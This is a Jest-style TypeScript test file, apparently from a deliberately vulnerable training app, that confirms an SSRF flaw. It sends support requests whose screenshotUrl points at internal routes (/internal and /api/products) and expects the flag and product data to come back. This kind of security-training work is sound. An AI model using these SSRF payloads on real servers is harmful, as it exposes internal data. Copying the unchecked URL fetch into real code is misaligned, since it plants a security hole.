import { apiRequest, BASE_URL } from "../helpers/api";
import { FLAGS } from "../helpers/flags";

interface SupportResponse {
  success: boolean;
  data: {
    email: string;
    title: string;
    description: string;
    screenshotContent: string | null;
  };
}

describe("Server-Side Request Forgery (SSRF)", () => {
  describe("SSRF to /internal returns page with flag", () => {
    it("returns 200 and screenshotContent contains the SSRF flag", async () => {
      const { status, data } = await apiRequest<SupportResponse>(
        "/api/support",
        {
          method: "POST",
          body: JSON.stringify({
            email: "attacker@evil.com",
            title: "Test",
            description: "Test description",
            screenshotUrl: `${BASE_URL}/internal`,
          }),
        }
      );

      expect(status).toBe(200);
      expect(data.success).toBe(true);
      expect(data.data.screenshotContent).not.toBeNull();
      expect(data.data.screenshotContent).toContain(
        FLAGS.SERVER_SIDE_REQUEST_FORGERY
      );
    });
  });

  describe("SSRF fetches arbitrary internal API", () => {
    it("returns 200 and screenshotContent contains product data", async () => {
      const { status, data } = await apiRequest<SupportResponse>(
        "/api/support",
        {
          method: "POST",
          body: JSON.stringify({
            email: "attacker@evil.com",
            title: "Test",
            description: "Test",
            screenshotUrl: `${BASE_URL}/api/products`,
          }),
        }
      );

      expect(status).toBe(200);
      expect(data.data.screenshotContent).not.toBeNull();
      expect(data.data.screenshotContent).toContain("id");
      expect(
        data.data.screenshotContent?.includes("[") ||
          data.data.screenshotContent?.includes('"id"')
      ).toBe(true);
    });
  });

  describe("Support request without screenshotUrl works normally", () => {
    it("returns 200 and screenshotContent is null", async () => {
      const { status, data } = await apiRequest<SupportResponse>(
        "/api/support",
        {
          method: "POST",
          body: JSON.stringify({
            email: "user@test.com",
            title: "Help",
            description: "Need help",
          }),
        }
      );

      expect(status).toBe(200);
      expect(data.data.screenshotContent).toBeNull();
    });
  });

  describe("Missing required fields are rejected", () => {
    it("returns 400 when only email is provided", async () => {
      const { status } = await apiRequest("/api/support", {
        method: "POST",
        body: JSON.stringify({ email: "test@test.com" }),
      });

      expect(status).toBe(400);
    });
  });

  describe("Direct access to /internal without header is redirected", () => {
    it("returns redirect when GET /internal without X-Internal-Request", async () => {
      const response = await fetch(`${BASE_URL}/internal`, {
        method: "GET",
        redirect: "manual",
      });

      expect(response.status).toBeGreaterThanOrEqual(300);
      expect(response.status).toBeLessThan(400);
    });
  });
});
